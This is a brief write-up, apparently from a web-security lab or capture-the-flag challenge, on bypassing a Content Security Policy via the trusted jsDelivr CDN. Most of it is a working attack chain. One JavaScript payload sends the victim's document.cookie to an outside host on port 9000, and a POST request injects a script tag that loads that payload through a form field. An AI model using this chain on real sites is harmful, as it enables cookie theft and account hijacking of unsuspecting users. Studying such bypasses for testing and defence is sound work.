# Detection
- Find CSP header in response and 
  ```bash
  Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'
  ```
- Check the CSP security in _https://csp-evaluator.withgoogle.com/_ to find wich tag is missing.
- Find a trusted origin.
  - Here is `https://cdn.jsdelivr.net` and by check it's documentation we can see that we're able to bind out Github file to it.
  - https://cdn.jsdelivr.net/gh/user/repo@version/file  →  https://cdn.jsdelivr.net/gh/z0r8a/temp/evil4.js
- Put maliciuos payload for blind xss in our Github repository (`evil4.js`)
  ```javascript
  var xhttp = new XMLHttpRequest();
  xhttp.open('GET', 'http://cvefix.ir:9000?' + document.cookie, true);
  xhttp.send();
  ```
- Put the payload in request.
  - `"` should be scaped in Burp. 
  ```bash
  POST /api/submit HTTP/1.1
  (Request Body)
  {"halloween_name":"<script src=\"https://cdn.jsdelivr.net/gh/z0r8a/temp/evil4.js\"></script>","email":"ehsan@ehsan.com","costume_type":"spellcaster","trick_or_treat":"tricks"}
  ```


# Resource
- https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
